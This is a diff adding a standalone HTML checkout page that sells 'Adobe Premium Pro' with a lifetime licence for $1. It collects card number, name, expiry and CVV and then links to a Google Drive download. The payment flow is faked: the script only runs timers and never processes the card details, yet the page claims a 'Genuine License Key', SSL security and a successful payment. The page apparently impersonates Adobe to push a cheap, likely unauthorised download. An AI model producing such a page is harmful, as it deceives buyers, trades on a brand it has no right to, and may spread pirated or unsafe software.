@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Checkout — Adobe Premium Pro</title>
+<style>
+  *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',system-ui,sans-serif}
+  body{
+    min-height:100vh;display:flex;justify-content:center;align-items:center;
+    background:radial-gradient(circle at 20% 20%,#1e1b4b,#0f0a1e 60%);
+    padding:20px;color:#fff;
+  }
+  .card{
+    width:100%;max-width:440px;background:rgba(255,255,255,.06);
+    border:1px solid rgba(255,255,255,.12);border-radius:22px;
+    padding:28px;backdrop-filter:blur(20px);
+    box-shadow:0 30px 70px rgba(0,0,0,.6);
+    transition:.4s;
+  }
+  .head{display:flex;justify-content:space-between;align-items:center;margin-bottom:22px}
+  .head h2{font-size:17px;font-weight:600;letter-spacing:.3px}
+  .amount{
+    font-size:26px;font-weight:800;
+    background:linear-gradient(90deg,#22d3ee,#a78bfa);
+    -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  }
+
+  .product{
+    display:flex;gap:12px;align-items:center;background:rgba(255,255,255,.05);
+    border:1px solid rgba(255,255,255,.08);border-radius:14px;padding:14px;margin-bottom:18px;
+  }
+  .thumb{
+    width:44px;height:44px;border-radius:10px;flex-shrink:0;
+    background:linear-gradient(135deg,#7c3aed,#ec4899);
+    display:flex;align-items:center;justify-content:center;font-weight:800;font-size:13px;
+  }
+  .product small{display:block;color:#9ca3af;font-size:12px;margin-top:3px}
+
+  /* Feature list */
+  .features{
+    display:grid;grid-template-columns:1fr 1fr;gap:9px 14px;
+    background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08);
+    border-radius:14px;padding:16px;margin-bottom:22px;
+  }
+  .features li{
+    list-style:none;display:flex;align-items:flex-start;gap:7px;
+    font-size:12.5px;color:#d1d5db;line-height:1.4;
+  }
+  .features li span{color:#34d399;font-size:12px;line-height:1.4}
+
+  /* Buy button */
+  .buy-btn{
+    width:100%;padding:16px;border:none;border-radius:14px;cursor:pointer;
+    font-size:16px;font-weight:700;color:#000;
+    background:linear-gradient(90deg,#22d3ee,#a78bfa);
+    display:flex;align-items:center;justify-content:center;gap:10px;
+    transition:.25s;
+  }
+  .buy-btn:hover{transform:translateY(-2px);box-shadow:0 12px 30px rgba(124,58,237,.45)}
+  .buy-btn:active{transform:scale(.98)}
+  .buy-btn[disabled]{opacity:.7;cursor:not-allowed;transform:none}
+
+  .spinner{
+    width:16px;height:16px;border:2px solid rgba(0,0,0,.25);
+    border-top-color:#000;border-radius:50%;animation:spin .6s linear infinite;
+  }
+  @keyframes spin{to{transform:rotate(360deg)}}
+
+  /* Card form */
+  .form{display:none;animation:fade .35s ease}
+  @keyframes fade{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+
+  .card-visual{
+    background:linear-gradient(135deg,#4c1d95,#1e3a8a);border-radius:16px;
+    padding:18px;margin-bottom:20px;position:relative;overflow:hidden;
+  }
+  .card-visual::after{
+    content:'';position:absolute;width:160px;height:160px;border-radius:50%;
+    background:rgba(255,255,255,.08);top:-60px;right:-40px;
+  }
+  .chip{width:34px;height:26px;border-radius:5px;background:linear-gradient(135deg,#fde68a,#d97706);margin-bottom:18px}
+  .card-num{font-size:18px;letter-spacing:2.5px;font-family:monospace;margin-bottom:16px;min-height:22px}
+  .card-meta{display:flex;justify-content:space-between;font-size:11px;color:#c4b5fd}
+  .card-meta b{display:block;color:#fff;font-size:13px;letter-spacing:1px;margin-top:3px;font-family:monospace}
+
+  label{display:block;font-size:12px;color:#9ca3af;margin:0 0 6px 4px;letter-spacing:.4px}
+  .row{display:flex;gap:12px}
+  .row>div{flex:1}
+  input{
+    width:100%;padding:13px 14px;border-radius:11px;font-size:15px;
+    background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.12);
+    color:#fff;outline:none;transition:.2s;font-family:monospace;
+  }
+  input::placeholder{color:#4b5563;font-family:'Segoe UI',sans-serif}
+  input:focus{border-color:#a78bfa;box-shadow:0 0 0 3px rgba(167,139,250,.15);background:rgba(255,255,255,.09)}
+  .field{margin-bottom:14px}
+
+  .pay-btn{
+    width:100%;padding:16px;border:none;border-radius:14px;cursor:pointer;
+    font-size:16px;font-weight:700;color:#000;margin-top:8px;
+    background:linear-gradient(90deg,#34d399,#22d3ee);
+    display:flex;align-items:center;justify-content:center;gap:10px;transition:.25s;
+  }
+  .pay-btn:hover{transform:translateY(-2px);box-shadow:0 12px 30px rgba(52,211,153,.4)}
+  .pay-btn[disabled]{opacity:.75;cursor:not-allowed;transform:none}
+
+  .secure{text-align:center;font-size:11px;color:#6b7280;margin-top:14px}
+
+  /* Success */
+  .success{display:none;text-align:center;animation:fade .4s ease}
+  .tick{
+    width:64px;height:64px;border-radius:50%;margin:0 auto 18px;
+    background:rgba(52,211,153,.15);border:2px solid #34d399;
+    display:flex;align-items:center;justify-content:center;font-size:30px;
+  }
+  .success h3{font-size:19px;margin-bottom:8px;color:#34d399}
+  .success p{font-size:13px;color:#9ca3af;margin-bottom:20px;line-height:1.6}
+  .dl{
+    display:block;width:100%;padding:15px;border-radius:13px;text-decoration:none;
+    font-weight:700;color:#000;background:linear-gradient(90deg,#34d399,#22d3ee);
+    transition:.25s;
+  }
+  .dl:hover{transform:translateY(-2px);box-shadow:0 12px 30px rgba(52,211,153,.4)}
+</style>
+</head>
+<body>
+
+<div class="card">
+
+  <!-- STEP 1 -->
+  <div id="step1">
+    <div class="head">
+      <h2>Checkout</h2>
+      <div class="amount">$1.00</div>
+    </div>
+
+    <div class="product">
+      <div class="thumb">PR</div>
+      <div>
+        <div style="font-size:14px;font-weight:600">Adobe Premium Pro</div>
+        <small>Lifetime Access • Instant Delivery</small>
+      </div>
+    </div>
+
+    <ul class="features">
+      <li><span>✅</span> Full Premium Access</li>
+      <li><span>✅</span> Lifetime Activation</li>
+      <li><span>✅</span> Instant Email Delivery</li>
+      <li><span>✅</span> Genuine License Key</li>
+      <li><span>✅</span> Windows &amp; Mac Support</li>
+      <li><span>✅</span> No Monthly Fees</li>
+      <li><span>✅</span> Free Future Updates</li>
+      <li><span>✅</span> 24/7 Customer Support</li>
+      <li><span>✅</span> 100% Safe &amp; Secure</li>
+      <li><span>✅</span> Money-Back Guarantee</li>
+    </ul>
+
+    <button class="buy-btn" id="buyBtn" onclick="startBuy()">
+      <span id="buyText">Buy Now — $1</span>
+    </button>
+  </div>
+
+  <!-- STEP 2 -->
+  <div class="form" id="step2">
+    <div class="head">
+      <h2>Pay with Card</h2>
+      <div class="amount">$1.00</div>
+    </div>
+
+    <div class="card-visual">
+      <div class="chip"></div>
+      <div class="card-num" id="visualNum">•••• •••• •••• ••••</div>
+      <div class="card-meta">
+        <div>CARD HOLDER<b id="visualName">YOUR NAME</b></div>
+        <div>EXPIRES<b id="visualExp">MM/YY</b></div>
+      </div>
+    </div>
+
+    <div class="field">
+      <label>Card Number</label>
+      <input type="text" id="cardNum" inputmode="numeric" placeholder="4242 4242 4242 4242" maxlength="19">
+    </div>
+
+    <div class="field">
+      <label>Cardholder Name</label>
+      <input type="text" id="cardName" placeholder="e.g. JOHN SMITH" style="font-family:'Segoe UI',sans-serif">
+    </div>
+
+    <div class="row">
+      <div class="field">
+        <label>Expiry Date</label>
+        <input type="text" id="exp" inputmode="numeric" placeholder="MM/YY" maxlength="5">
+      </div>
+      <div class="field">
+        <label>CVV</label>
+        <input type="password" id="cvv" inputmode="numeric" placeholder="•••" maxlength="4">
+      </div>
+    </div>
+
+    <button class="pay-btn" id="payBtn" onclick="doPay()">
+      <span id="payText">Pay $1.00</span>
+    </button>
+
+    <div class="secure">🔒 Secured with 256-bit SSL Encryption</div>
+  </div>
+
+  <!-- STEP 3 -->
+  <div class="success" id="step3">
+    <div class="tick">✓</div>
+    <h3>Payment Successful!</h3>
+    <p>Your premium access is ready.<br>Click the button below to download.</p>
+    <a class="dl" href="https://drive.google.com/file/d/1YCTBf1y4KH8PfYCMK5TzzkzUQ3v59miK/view" target="_blank">
+      📥 Download Now
+    </a>
+  </div>
+
+</div>
+
+<script>
+/* ---------- STEP 1: Buy button loading ---------- */
+function startBuy(){
+  const btn = document.getElementById('buyBtn');
+  const txt = document.getElementById('buyText');
+  btn.disabled = true;
+  txt.textContent = 'Loading';
+  const sp = document.createElement('span');
+  sp.className = 'spinner';
+  btn.appendChild(sp);
+
+  setTimeout(() => {
+    document.getElementById('step1').style.display = 'none';
+    document.getElementById('step2').style.display = 'block';
+  }, 1200);
+}
+
+/* ---------- Live card visual ---------- */
+const cardNum = document.getElementById('cardNum');
+const cardName = document.getElementById('cardName');
+const exp = document.getElementById('exp');
+
+cardNum.addEventListener('input', e => {
+  let v = e.target.value.replace(/\D/g,'').slice(0,16);
+  e.target.value = v.replace(/(.{4})/g,'$1 ').trim();
+  document.getElementById('visualNum').textContent =
+    e.target.value.padEnd(19,'•');
+});
+
+cardName.addEventListener('input', e => {
+  document.getElementById('visualName').textContent =
+    e.target.value.toUpperCase() || 'YOUR NAME';
+});
+
+exp.addEventListener('input', e => {
+  let v = e.target.value.replace(/\D/g,'').slice(0,4);
+  if (v.length >= 3) v = v.slice(0,2) + '/' + v.slice(2);
+  e.target.value = v;
+  document.getElementById('visualExp').textContent = v || 'MM/YY';
+});
+
+/* ---------- STEP 2: Pay button loading → success ---------- */
+function doPay(){
+  const btn = document.getElementById('payBtn');
+  const txt = document.getElementById('payText');
+  btn.disabled = true;
+  txt.textContent = 'Processing';
+  const sp = document.createElement('span');
+  sp.className = 'spinner';
+  btn.appendChild(sp);
+
+  setTimeout(() => {
+    document.getElementById('step2').style.display = 'none';
+    document.getElementById('step3').style.display = 'block';
+  }, 1800);
+}
+</script>
+
+</body>
+</html>
